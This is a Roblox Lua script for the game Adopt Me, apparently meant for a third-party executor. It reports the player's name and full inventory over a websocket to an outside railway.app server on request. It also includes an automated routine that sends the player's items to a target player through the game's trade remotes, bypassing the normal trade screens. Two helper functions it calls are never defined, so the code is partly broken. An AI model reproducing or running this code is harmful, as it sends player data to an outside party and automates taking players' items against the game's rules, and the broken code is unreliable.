local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ScreenGui = game:GetService("Players")


local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
local ClientData = Fsys("ClientData")
local RouterClient = Fsys("RouterClient")

local inventory = ClientData.get("inventory")

local VERSION = "1"
local HANDSHAKE_COMPLETED = false

local hasDelivery = false
local playersToDeliver = {}

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Adopt Me API",
    Text = "v" .. VERSION,
    Icon = ""
})

local function extractInventoryData(data, categorized)
    categorized = categorized or {}
    for _, v in pairs(data) do
        if type(v) == "table" then
            if v.category or v.id then
                local cat = tostring(v.category or "unknown")
                local id  = tostring(v.id       or "unknown")

                if not categorized[cat] then
                    categorized[cat] = {}
                end

                if categorized[cat][id] then
                    categorized[cat][id].amount = categorized[cat][id].amount + 1
                else
                    categorized[cat][id] = { item = id, amount = 1 }
                end
            end
            extractInventoryData(v, categorized)
        end
    end
    return categorized
end

local function deliverItems(targetPlayer, itemsToDeliver)

    local inventory = ClientData.get("inventory")
    local inventoryIndex = flattenInventory(inventory)

    local allItemsFlattened = {}

    for _, entry in ipairs(itemsToDeliver) do
        if #(inventoryIndex[entry.id] or {}) < entry.amount then
            warn("Not enough items for:", entry.id)
        end

        for i = 1, entry.amount do
            table.insert(allItemsFlattened, entry.id)
        end
    end

    local batches = {}
    for i = 1, #allItemsFlattened, 18 do
        local batch = {}
        for j = i, math.min(i + 17, #allItemsFlattened) do
            table.insert(batch, allItemsFlattened[j])
        end
        table.insert(batches, batch)
    end

    for _, currentBatch in ipairs(batches) do
        print("Starting trade batch for " .. #currentBatch .. " items")

        RouterClient.get("TradeAPI/SendTradeRequest"):FireServer(targetPlayer)

        if not game.Players.LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
            repeat task.wait(.5)
            until game.Players.LocalPlayer.PlayerGui.TradeApp.Frame.Visible
        end

        for _, itemId in ipairs(currentBatch) do
            local itemUid = takeUnique(inventoryIndex, itemId)

            if itemUid then
                RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(itemUid)
                task.wait(0.1)
            else
                warn("Ran out of uniques for:", itemId)
            end
        end

        RouterClient.get("TradeAPI/AcceptNegotiation"):FireServer()

        if not game.Players.LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible then
            repeat task.wait(.5)
            until game.Players.LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible
        end

        task.wait(.5)

        RouterClient.get("TradeAPI/ConfirmTrade"):FireServer()

        task.wait(2)
    end
end


local function buildPayload()
    local categorized = extractInventoryData(inventory)
    local payload = {}

    for cat, items in pairs(categorized) do
        local itemList = {}
        for _, itemData in pairs(items) do
            table.insert(itemList, itemData)
        end
        table.insert(payload, {
            category = cat,
            items = itemList
        })
    end

    return payload
end

local ws = WebSocket.connect("wss://websocket-production-fb0a.up.railway.app")


ws:Send(HttpService:JSONEncode({
    type = "IDENTIFICATION",
    username = game.Players.LocalPlayer.Name
}))

ws.OnMessage:Connect(function(msg)
    local data
    pcall(function()
        data = HttpService:JSONDecode(msg)
    end)
    if not data then return end

    if data.type == "HANDSHAKE" and not HANDSHAKE_COMPLETED then
        HANDSHAKE_COMPLETED = true
        print("Handshake completed with server.")
    end

    if data.type == "REQUEST_INVENTORY" then
        ws:Send(HttpService:JSONEncode({
            type = "INVENTORY_DATA",
            username = game.Players.LocalPlayer.Name,
            payload = buildPayload()
        }))
    end
end)


-- RunService.RenderStepped:Connect(function()
-- 	if not hasDelivery then return end
	
-- 	-- has a delivery cheks for player inside of the server
-- 	local deliveryTarget = game.Players[playersToDeliver[1]]
-- 	if not deliveryTarget then return end
	
-- 	-- check for delivery target character to ensure they are loaded in
	
-- 	-- trade them
--     game.ReplicatedStorage.API["TradeAPI/SendTradeRequest"]:FireServer(deliveryTarget)

-- 	-- subtract the amount 
	
-- 	-- repeats 17-18 until fully delivered
	
-- 	-- remove the delivery from the tablee.
	
	
	
-- end)